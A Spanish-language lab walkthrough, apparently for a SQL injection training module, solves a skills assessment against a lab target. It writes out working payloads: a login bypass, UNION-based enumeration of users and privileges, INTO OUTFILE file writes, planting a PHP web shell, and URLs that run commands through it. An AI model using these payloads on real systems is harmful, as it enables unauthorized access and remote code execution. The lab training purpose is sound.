# SQL Injection Fundamentals

La empresa **Inlanefreight** le ha contratado para realizar una evaluación de la aplicación web de uno de sus sitios web públicos. A raíz de una reciente violación de la seguridad de uno de sus principales competidores, están especialmente preocupados por las vulnerabilidades de inyección SQL y el daño que el descubrimiento y la explotación exitosa de este ataque podrían causar a su imagen pública y a sus resultados financieros.

Te han proporcionado una dirección IP de destino y ninguna otra información sobre su sitio web. Realiza una evaluación completa de la aplicación web desde un enfoque de «caja gris», comprobando la existencia de vulnerabilidades de inyección SQL.

Encuentra las vulnerabilidades y envía una bandera final utilizando las habilidades que hemos visto para completar este módulo. ¡No olvides pensar fuera de lo establecido!

**Pregunta 1**: Evalúa la aplicación web y utiliza diversas técnicas para obtener la ejecución remota de código y encontrar una flag en el directorio raíz del sistema de archivos. Envía el contenido de la flag como respuesta.

1. Empezaremos a probar payloads para ver con que podemos ganar acceso, ya que nos encontramos un formulario de login al entrar en la web:

<figure><img src="../../../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

2. Conseguimos acceder con el payload:

```
' OR 1=1 LIMIT 1-- -'
```

<figure><img src="../../../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

3. Ahora probaremos cuantas columnas devuelve a base de payloads:

```
' ORDER BY 1-- -'
' ORDER BY 2-- -'
' ORDER BY 3-- -'
' ORDER BY 4-- -'
' ORDER BY 5-- -'
' ORDER BY 6-- -'
```

<figure><img src="../../../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

3. El máximo de columnas devueltas es 5.
4. Realizaremos la enumeración de usuarios:

```
' UNION SELECT NULL,user(),NULL,NULL,NULL--
```

<figure><img src="../../../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

5. Habiendo enumerado el usuario, vamos a enumerar sus permisos:

```
' UNION SELECT NULL,grantee,privilege_type,NULL,NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"--
```

<figure><img src="../../../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

6. Identificamos uno d elos privilegios que nos interesa que es FILE:

<figure><img src="../../../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

7. Comprobamos si secure\_file\_priv está habilitado:

```
' UNION SELECT NULL,variable_name,variable_value,NULL,NULL FROM information_schema.global_variables WHERE variable_name="secure_file_priv"--
```

<figure><img src="../../../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

8. Vemos que no retorna ningún valor, así que podemos escribir en cualquier ubicación del sistema.
9. Haremos una prueba de escritura:

```
random' UNION SELECT "",'This is my test file',"","","" INTO OUTFILE '/var/www/html/dashboard/test.txt'--
```

8. Comprobamos que el archivo se ha creado con el contenido:

<figure><img src="../../../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

11. Crearemos una web shell para la ejecución de código remoto:

```
random' UNION SELECT "",'',"","","" INTO OUTFILE '/var/www/html/dashboard/shell.php'--
```

<figure><img src="../../../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

12. Mostraremos la flag a través de la URL y codificando en formato URL para que se ejecuten los comandos:

```
http://94.237.58.140:45981/dashboard/shell.php?0=ls%20-l%20/
```

```
http://94.237.58.140:45981/dashboard/shell.php?0=cat%20/flag.txt
```
